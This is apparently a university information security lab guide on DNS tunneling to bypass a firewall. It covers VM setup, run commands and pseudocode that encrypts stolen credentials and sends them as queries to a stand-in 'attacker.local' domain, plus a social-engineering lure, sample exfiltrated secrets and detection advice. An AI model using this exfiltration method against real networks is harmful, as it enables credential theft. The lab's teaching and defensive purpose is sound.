# Lab 7-P1: DNS Tunneling Firewall Bypass
## Complete VM Setup and Testing Guide

---

## Lab Overview

### Scenario
You're simulating a **firewall bypass attack** using DNS tunneling:

1. **Environment**: Network with firewall that:
   - Blocks non-standard ports
   - Inspects traffic
   - Allows outbound HTTP and DNS traffic

2. **Attacker**: Outside the network
3. **Target**: Employee inside the network
4. **Social Engineering**: Fake LinkedIn profile to build trust
5. **Attack Vector**: DNS tunneling with RSA encryption

### Attack Chain
```
Social Engineering → Target Runs Client → Data Exfiltration via DNS → 
Firewall Allows DNS → Attacker Receives Encrypted Data → Success
```

---

## Part 1: VM Requirements

### Option A: Single VM (Recommended for Testing)
- **OS**: Ubuntu 22.04 LTS (or Windows 10/11)
- **RAM**: 2GB minimum
- **Disk**: 20GB
- **Network**: NAT or Host-Only
- **Python**: 3.8 or higher

### Option B: Two VMs (Realistic Scenario)
- **VM1 (Attacker)**: Ubuntu/Linux, runs DNS server
- **VM2 (Target)**: Windows/Linux, runs client
- **Network**: Both on same internal network

---

## Part 2: Software Installation

### Ubuntu/Linux Setup

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python 3 and pip
sudo apt install python3 python3-pip -y

# Install required Python libraries
pip3 install pycryptodome

# Verify installation
python3 --version
python3 -c "from Crypto.PublicKey import RSA; print('Crypto OK')"
```

### Windows Setup

```powershell
# Install Python from python.org (3.8+)
# During installation, check "Add Python to PATH"

# Open Command Prompt or PowerShell as Administrator
# Install required libraries
pip install pycryptodome

# Verify installation
python --version
python -c "from Crypto.PublicKey import RSA; print('Crypto OK')"
```

---

## Part 3: File Setup

### Download Lab Files

Create project directory:
```bash
# Linux/Mac
mkdir -p ~/csc323/lab7
cd ~/csc323/lab7

# Windows
mkdir C:\csc323\lab7
cd C:\csc323\lab7
```

### Required Files
1. `dns_tunnel_simple.py` - Main implementation (simplified)
2. `dns_tunnel.py` - Advanced implementation (full DNS)
3. This guide

---

## Part 4: Quick Start - Simplified Version

### Method 1: Full Demonstration (Easiest)

```bash
# Run the complete demonstration
python3 dns_tunnel_simple.py demo
```

**What This Does:**
1. Sets up attacker's DNS server
2. Generates RSA encryption keys
3. Simulates target employee running client
4. Exfiltrates sample sensitive data
5. Shows decryption on attacker's side
6. Generates attack summary report

**Expected Output:**
```
╔═══════════════════════════════════════════════════════════╗
║  Lab 7-P1: DNS Tunneling Firewall Bypass                 ║
║  CSC323 Information Security                              ║
║  Simplified Implementation for VM Testing                 ║
╚═══════════════════════════════════════════════════════════╝

SCENARIO DEMONSTRATION
...

PHASE 1: Attacker Sets Up DNS Tunnel Server
[*] Generating RSA keys (2048 bits)...
[+] RSA keys generated successfully
[+] Public key saved to shared directory

PHASE 2: Target Employee Runs Client Code
[+] Loaded server's public key

PHASE 3: Exfiltrating Sensitive Data via DNS
[*] Exfiltrating data via DNS tunnel...
[*] Data: username:admin password:SecretPass123
[+] Data encrypted (RSA + AES hybrid)
[+] Data base64 encoded
[+] DNS query saved
...

PHASE 4: Attacker Receives and Decrypts Data
[*] Processing: exfil_20250204_143022_123456.dns
[+] DECRYPTED DATA: username:admin password:SecretPass123
...

ATTACK SUMMARY
[+] Total records exfiltrated: 4
[+] Firewall bypass: SUCCESSFUL
[+] Encryption used: RSA-2048 + AES-256
```

### Method 2: Interactive Testing

**Terminal 1 - Start Server (Attacker):**
```bash
python3 dns_tunnel_simple.py server
```

**Terminal 2 - Start Client (Target):**
```bash
python3 dns_tunnel_simple.py client
```

Then enter data to exfiltrate:
```
Data> secret_password_123
Data> credit_card:1234-5678-9012-3456
Data> confidential_report.pdf_location
Data> quit
```

**Back to Server Terminal:**
Press Enter to check for new data. You'll see decrypted data.

---

## Part 5: Understanding the Code

### Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    ATTACKER (OUTSIDE)                   │
├─────────────────────────────────────────────────────────┤
│  1. Generate RSA key pair                               │
│  2. Distribute public key (via social engineering)      │
│  3. Run DNS tunnel server                               │
│  4. Receive DNS queries with encrypted data             │
│  5. Decrypt with private key                            │
└─────────────────────────────────────────────────────────┘
                           ▲
                           │ DNS queries
                           │ (allowed by firewall)
                           │
┌─────────────────────────────────────────────────────────┐
│                      FIREWALL                           │
│  ✓ Allows DNS traffic (port 53)                         │
│  ✓ Allows HTTP traffic (port 80/443)                    │
│  ✗ Blocks other ports                                   │
│  ✗ Cannot inspect encrypted DNS payloads                │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                 TARGET EMPLOYEE (INSIDE)                │
├─────────────────────────────────────────────────────────┤
│  1. Receives "harmless tool" via social engineering     │
│  2. Runs client code                                    │
│  3. Client loads attacker's public key                  │
│  4. Encrypts sensitive data                             │
│  5. Sends via DNS queries to attacker's server          │
└─────────────────────────────────────────────────────────┘
```

### Encryption Process

```python
# CLIENT SIDE (Target Employee)
data = "secret_password"

# 1. Generate random AES-256 key
aes_key = random_bytes(32)

# 2. Encrypt data with AES
encrypted_data = AES.encrypt(data, aes_key)

# 3. Encrypt AES key with attacker's RSA public key
encrypted_key = RSA.encrypt(aes_key, attacker_public_key)

# 4. Combine and base64 encode
payload = base64(encrypted_key + encrypted_data)

# 5. Send as DNS query
dns_query = f"{payload}.attacker.local"
```

```python
# SERVER SIDE (Attacker)
# Receives: "base64_payload.attacker.local"

# 1. Extract and decode payload
payload = base64_decode(dns_query.split('.')[0])

# 2. Decrypt AES key with RSA private key
aes_key = RSA.decrypt(encrypted_key, private_key)

# 3. Decrypt data with AES key
data = AES.decrypt(encrypted_data, aes_key)

# Result: "secret_password"
```

---

## Part 6: Step-by-Step Walkthrough

### Demonstration Walkthrough

Follow these steps to understand each phase:

#### Phase 1: Attacker Setup

```bash
python3 dns_tunnel_simple.py server

# Observe:
# - RSA key generation
# - Public key saved to shared directory
# - Server waiting for data
```

**What's Happening:**
- Attacker generates 2048-bit RSA key pair
- Private key kept secret
- Public key distributed to target (via social engineering)

#### Phase 2: Social Engineering

In real scenario:
1. Attacker creates fake LinkedIn profile
2. Connects with target employee
3. Builds trust over time
4. Sends "useful tool" (contains client code)
5. Target runs the tool

**Simulated:**
```bash
python3 dns_tunnel_simple.py client
```

#### Phase 3: Data Exfiltration

```bash
# In client terminal
Data> employee_database_password:Admin123!

# Observe:
# [*] Data encrypted (RSA + AES hybrid)
# [+] Data base64 encoded
# [+] DNS query saved
```

**What's Happening:**
1. Client encrypts data with hybrid encryption
2. Converts to DNS-safe base64
3. Creates DNS query: `<encrypted_data>.attacker.local`
4. Firewall sees legitimate DNS query
5. Allows it through (DNS is permitted)

#### Phase 4: Data Reception

```bash
# In server terminal
# Press Enter

# Observe:
# [*] Processing DNS query
# [+] DECRYPTED DATA: employee_database_password:Admin123!
```

**What's Happening:**
1. Server receives DNS query
2. Extracts base64 payload
3. Decrypts with private RSA key
4. Recovers AES key
5. Decrypts data with AES
6. Displays plaintext data

---

## Part 7: Testing Scenarios

### Scenario 1: Credential Theft

```bash
# Client side
Data> admin_username:jsmith
Data> admin_password:P@ssw0rd123
Data> vpn_credentials:jsmith/SecureVPN!456

# Server receives and decrypts all credentials
```

### Scenario 2: Document Exfiltration

```bash
# Client side
Data> confidential_file:/home/user/Documents/Q4_Report.pdf
Data> file_size:2.5MB
Data> file_hash:a3f5b9c2e1d4...

# Server knows which files were accessed
```

### Scenario 3: Database Access

```bash
# Client side
Data> db_host:internal-db.company.local
Data> db_user:root
Data> db_pass:RootPass2024
Data> db_name:customer_records

# Server has complete database access info
```

### Scenario 4: Session Hijacking

```bash
# Client side
Data> session_token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Data> cookie:session_id=abc123def456

# Server can hijack user sessions
```

---

## Part 8: Log Analysis

### Log Files Created

```
csc323/lab7/
├── logs/
│   └── firewall_bypass.log      # Detailed event log
├── dns_tunnel_shared/
│   ├── public_key.pem            # RSA public key
│   ├── exfil_*.dns              # DNS queries (before processing)
│   └── exfil_*.processed        # Processed queries
└── attack_summary.json          # Attack summary report
```

### Analyzing Logs

```bash
# View event log
cat logs/firewall_bypass.log

# Example output:
2025-02-04 14:30:15 | RSA_KEYGEN | Generated 2048-bit RSA key pair
2025-02-04 14:30:16 | SERVER_SETUP | DNS tunnel server initialized
2025-02-04 14:30:22 | CLIENT_SETUP | DNS tunnel client initialized
2025-02-04 14:30:25 | DATA_EXFIL | Exfiltrated: username:admin password:SecretPass123
2025-02-04 14:30:28 | DATA_RECEIVED | username:admin password:SecretPass123
```

### Attack Summary Report

```bash
cat attack_summary.json
```

```json
{
  "attack_date": "2025-02-04T14:30:15.123456",
  "records_exfiltrated": 4,
  "encryption": "RSA-2048 + AES-256",
  "bypass_method": "DNS Tunneling",
  "data": [
    {
      "file": "exfil_20250204_143025_123456.dns",
      "timestamp": "2025-02-04T14:30:25.123456",
      "data": "username:admin password:SecretPass123"
    },
    ...
  ]
}
```

---

## Part 9: Advanced Testing (Optional)

### Using the Full DNS Implementation

For more realistic testing with actual DNS protocol:

```bash
# Requires root/admin for port 53
sudo python3 dns_tunnel.py server

# In another terminal
python3 dns_tunnel.py client --server localhost --data "secret_data"
```

**Differences:**
- Uses real DNS protocol (UDP port 53)
- Creates actual DNS packets
- More realistic firewall bypass simulation
- Requires elevated privileges

---

## Part 10: Troubleshooting

### Issue 1: ImportError: No module named 'Crypto'

**Solution:**
```bash
pip3 install pycryptodome

# NOT pycrypto (outdated)
# Make sure it's pycryptodome
```

### Issue 2: Permission Denied (Port 53)

**Solution:**
```bash
# Use simplified version (no special permissions needed)
python3 dns_tunnel_simple.py demo

# OR run with sudo for full DNS version
sudo python3 dns_tunnel.py server
```

### Issue 3: Public Key Not Found

**Error:** `[!] Public key not found. Run server first!`

**Solution:**
```bash
# Make sure to run server mode first
python3 dns_tunnel_simple.py server

# This creates the public key file
# Then run client in another terminal
```

### Issue 4: No Data Received

**Solution:**
```bash
# Make sure you've sent data from client first
# Then in server terminal, press Enter to check

# Check shared directory
ls -la dns_tunnel_shared/

# You should see .dns files if data was sent
```

---

## Part 11: Lab Report Structure

### Required Documentation

#### 1. Executive Summary (1 page)
- Scenario description
- Attack objective
- Results summary
- Business impact

#### 2. Technical Background (1-2 pages)
- DNS protocol overview
- DNS tunneling explanation
- RSA/AES encryption overview
- Why firewalls allow DNS

#### 3. Implementation (2-3 pages)
- System architecture
- Code structure
- Encryption flow
- Network diagram

#### 4. Methodology (1-2 pages)
- VM setup process
- Software installation
- Testing procedures
- Social engineering scenario

#### 5. Results (2-3 pages)
- Demonstration screenshots
- Log file analysis
- Data exfiltration examples
- Attack timeline

#### 6. Analysis (2-3 pages)
- Why the attack succeeded
- Firewall limitations
- Detection challenges
- Real-world implications

#### 7. Mitigation Strategies (2 pages)
- DNS monitoring and filtering
- Encrypted DNS inspection
- Behavior-based detection
- Policy recommendations

#### 8. Conclusion (1 page)
- Lessons learned
- Defense-in-depth importance
- Future research directions

---

## Part 12: Required Screenshots

Capture these for your report:

```
screenshots/
├── 01_vm_setup.png              # VM configuration
├── 02_python_installation.png   # Python and libraries installed
├── 03_server_startup.png        # Server generating RSA keys
├── 04_client_startup.png        # Client loading public key
├── 05_data_exfiltration.png     # Client sending encrypted data
├── 06_dns_query.png             # DNS query format shown
├── 07_server_decryption.png     # Server decrypting data
├── 08_logs_viewer.png           # Viewing log files
├── 09_attack_summary.png        # Final attack summary
└── 10_shared_directory.png      # Contents of shared directory
```

---

## Part 13: Defense Mechanisms

### What Could Stop This Attack?

#### 1. DNS Monitoring
```bash
# Monitor for suspicious DNS patterns
- Unusually long subdomains
- High frequency of queries to single domain
- Base64-like patterns in queries
```

#### 2. DNS Filtering
```bash
# Block unknown domains
- Whitelist known DNS servers
- Block queries to non-corporate domains
- Inspect DNS query patterns
```

#### 3. Encrypted DNS Inspection
```bash
# Some advanced firewalls can:
- Decrypt DNS over HTTPS (DoH)
- Inspect DNS over TLS (DoT)
- Analyze encrypted traffic patterns
```

#### 4. Behavioral Analysis
```bash
# Detect anomalies:
- Employee suddenly making many DNS queries
- Queries to unusual domains
- Data volume inconsistent with normal usage
```

---

## Part 14: Lab Deliverables Checklist

Ensure you have:

**Code (30%)**
- [ ] dns_tunnel_simple.py runs successfully
- [ ] Demo mode completes without errors
- [ ] Server mode functional
- [ ] Client mode functional
- [ ] Code is well-commented

**Documentation (30%)**
- [ ] Complete lab report (8-12 pages)
- [ ] All sections included
- [ ] Professional formatting
- [ ] Proper citations
- [ ] Grammar and spelling checked

**Demonstrations (20%)**
- [ ] 10 required screenshots captured
- [ ] Screenshots labeled and captioned
- [ ] Attack timeline documented
- [ ] Logs included as appendix

**Analysis (20%)**
- [ ] Vulnerability analysis completed
- [ ] Mitigation strategies detailed
- [ ] Real-world implications discussed
- [ ] Defense comparison table included

---

## Part 15: Grading Rubric

| Component | Points | Criteria |
|-----------|--------|----------|
| **Implementation** | 30 | Working code, successful demo, encryption works |
| **Documentation** | 30 | Complete report, clear explanations, good formatting |
| **Screenshots** | 20 | All phases captured, professional quality, labeled |
| **Analysis** | 20 | Deep understanding, good mitigations, real-world context |
| **Total** | 100 | |

---

## Part 16: Bonus Extensions (Optional)

### Extension 1: Add Multiple Clients
Modify code to handle multiple simultaneous targets

### Extension 2: Implement Defenses
Create detection mechanism for DNS tunneling

### Extension 3: Real DNS Server
Implement using actual DNS server (dnsmasq or BIND)

### Extension 4: Network Capture
Use Wireshark to capture and analyze DNS traffic

---

## Summary

This lab demonstrates:
✅ DNS tunneling for firewall bypass
✅ Hybrid RSA + AES encryption
✅ Social engineering attack vector
✅ Data exfiltration techniques
✅ Firewall limitations
✅ Defense strategies

**Key Takeaways:**
1. Firewalls allowing DNS can be exploited
2. Encryption hides malicious payloads
3. Social engineering enables initial access
4. Defense requires multiple layers
5. Monitoring and detection are crucial

Good luck with your lab!
